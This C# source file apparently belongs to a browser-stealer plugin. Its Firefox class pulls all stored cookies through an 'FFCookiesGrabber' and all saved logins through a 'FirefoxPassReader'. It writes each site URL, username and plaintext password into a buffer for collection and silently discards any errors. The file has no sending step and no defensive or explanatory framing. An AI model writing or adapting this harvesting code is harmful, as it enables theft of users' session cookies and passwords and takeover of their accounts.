using Plugin.Browsers.Firefox.Cookies;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
//using Plugin.Browsers.Firefox.Cookies;

namespace Plugin.Browsers.Firefox
{
    public class Firefox
    {
        public bool isOK = false;
        public void CookiesRecovery(StringBuilder Cooks)
        {
            try
            {
                List<FFCookiesGrabber.FirefoxCookie> ffcs = Cookies.FFCookiesGrabber.Cookies();
                foreach (FFCookiesGrabber.FirefoxCookie fcc in ffcs)
                {
                    if (!string.IsNullOrWhiteSpace(fcc.ToString()) && !isOK)
                    {
                        Cooks.Append("\n== Firefox ==========\n");
                        isOK = true;
                    }
                    Cooks.Append(string.Concat(new string[]
                       {
                            fcc.ToString(),
                            "\n\n",
                       }));
                }
                Cooks.Append("\n");
            }
            catch
            {
            }
        }

        public void CredRecovery(StringBuilder Pass)
        {
            try
            {

                foreach (IPassReader passReader in new List<IPassReader>
                {
                    new FirefoxPassReader()
                })
                {
                    foreach (CredentialModel credentialModel in passReader.ReadPasswords())
                    {
                        if (!string.IsNullOrWhiteSpace(credentialModel.Url) && !isOK)
                        {
                            Pass.Append("\n== Firefox ==========\n");
                            isOK = true;
                        }
                        Pass.Append(string.Concat(new string[]
                        {
                            credentialModel.Url,
                            "\nU: ",
                            credentialModel.Username,
                            "\nP: ",
                            credentialModel.Password,
                            "\n\n"
                        }));
                    }
                }
            }
            catch
            {
            }

        }

    }
}
